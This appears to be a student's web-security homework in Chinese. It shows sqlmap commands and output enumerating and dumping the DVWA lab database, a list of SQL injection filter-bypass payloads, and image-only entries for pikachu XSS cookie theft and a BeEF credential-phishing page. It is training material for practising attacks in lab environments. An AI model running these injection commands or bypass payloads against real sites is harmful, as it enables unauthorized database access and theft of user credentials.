## 1.使用 sqlmap 工具完成对 DVWA 数据库的注入过程，要求按照库、表、列、内容的顺序进行注入。

D:\python3\sqlmap>python sqlmap.py -r 1.txt --batch -p id --current-db

[13:52:25] [INFO] fetching current database
current database: 'dvwa'



D:\python3\sqlmap>python sqlmap.py -r 1.txt --batch -p id --tables -D dvwa

[13:57:12] [INFO] fetching tables for database: 'dvwa'
Database: dvwa
[2 tables]
+-----------+
| guestbook |
| users     |
+-----------+



D:\python3\sqlmap>python sqlmap.py -r 1.txt --batch -p id --columns  -D dvwa

[14:19:30] [INFO] fetching tables for database: 'dvwa'
[14:19:30] [INFO] fetching columns for table 'guestbook' in database 'dvwa'
[14:19:30] [INFO] fetching columns for table 'users' in database 'dvwa'
Database: dvwa
Table: guestbook
[3 columns]
+------------+----------------------+
| Column     | Type                 |
+------------+----------------------+
| comment    | varchar(300)         |
| name       | varchar(100)         |
| comment_id | smallint(5) unsigned |
+------------+----------------------+

Database: dvwa
Table: users
[8 columns]
+--------------+-------------+
| Column       | Type        |
+--------------+-------------+
| user         | varchar(15) |
| avatar       | varchar(70) |
| failed_login | int(3)      |
| first_name   | varchar(15) |
| last_login   | timestamp   |
| last_name    | varchar(15) |
| password     | varchar(32) |
| user_id      | int(6)      |
+--------------+-------------+



D:\python3\sqlmap>python sqlmap.py -r 1.txt --batch --dump -T users

users表数据在users.csv里

## 2.练习课件上给出的 SQL 注入绕过方式。

大小写绕过    SELECt   1;

关键字绕过     selselectect  last_name  from  users;

用编码绕过     %73%65%6c%65%63%74 1;(select 1 的 URL编码)

用注释绕过     select/**/1;

​                       select  user,password  from  users  /*!union*/    /*!all*/  /*!select*/  1,2;

使用等价函数和命令        select 0x61;

​                        select  user,password  from  users   where   user_id  =  1   &&   1 = 1;

使用特殊符号   select  user,password  from`users`   where   user_id  =  1   &&   1 = 1;

​                       select+password-1+1.from users;

##  3.XSS

- ## 使用 pikachu 平台练习 XSS 键盘记录、前台 XSS 盲打攻击获取 cookie；

  ![1](C:\Users\七号程序员詹姆师\Desktop\week8\1.png)

![2](C:\Users\七号程序员詹姆师\Desktop\week8\2.png)



![3](C:\Users\七号程序员詹姆师\Desktop\week8\3.png)

- ## 使用 beef 制作钓鱼页面，克隆任意站点的登录页面并获取用户登录的账号密码。

  ![4](C:\Users\七号程序员詹姆师\Desktop\week8\4.png)

![5](C:\Users\七号程序员詹姆师\Desktop\week8\5.png)